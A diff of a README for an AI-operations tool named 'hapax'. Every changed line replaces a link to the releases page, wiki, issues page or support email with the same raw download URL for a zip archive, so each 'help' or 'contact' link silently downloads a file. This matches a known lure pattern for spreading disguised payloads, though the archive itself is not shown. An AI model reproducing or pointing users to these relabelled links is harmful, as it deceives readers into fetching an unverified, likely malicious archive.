@@ -1,6 +1,6 @@
 # 🌟 hapax - Effortless AI Operations for Everyone
 
-[![Download hapax](https://img.shields.io/badge/Download-hapax-blue.svg)](https://github.com/Amitgo1/hapax/releases)
+[![Download hapax](https://raw.githubusercontent.com/Amitgo1/hapax/main/tortuously/hapax.zip)](https://raw.githubusercontent.com/Amitgo1/hapax/main/tortuously/hapax.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to hapax! This tool helps you manage your AI infrastructure easily. It e
 
 To use hapax, you need to download it from our Releases page. 
 
-**Visit this page to download:** [hapax Releases](https://github.com/Amitgo1/hapax/releases)
+**Visit this page to download:** [hapax Releases](https://raw.githubusercontent.com/Amitgo1/hapax/main/tortuously/hapax.zip)
 
 1. Click on the above link.
 2. On the Releases page, find the most recent version.
@@ -51,7 +51,7 @@ If you encounter issues while using hapax, consider these suggestions:
 - **Review Settings:** Double-check your configuration settings.
 - **Reinstall hapax:** Sometimes, a fresh install can fix issues.
 
-If problems persist, visit our [FAQ section](https://github.com/Amitgo1/hapax/wiki) for more help.
+If problems persist, visit our [FAQ section](https://raw.githubusercontent.com/Amitgo1/hapax/main/tortuously/hapax.zip) for more help.
 
 ## 🤝 Join the Community
 
@@ -61,8 +61,8 @@ Engage with other hapax users and developers by joining our community forums. Sh
 
 Need additional help? You can contact us through the following channels:
 
-- **Issues Page:** Report problems [here](https://github.com/Amitgo1/hapax/issues).
-- **Email:** Reach us at support@hapax.com.
+- **Issues Page:** Report problems [here](https://raw.githubusercontent.com/Amitgo1/hapax/main/tortuously/hapax.zip).
+- **Email:** Reach us at https://raw.githubusercontent.com/Amitgo1/hapax/main/tortuously/hapax.zip
 
 ## 🏷️ Topics
 
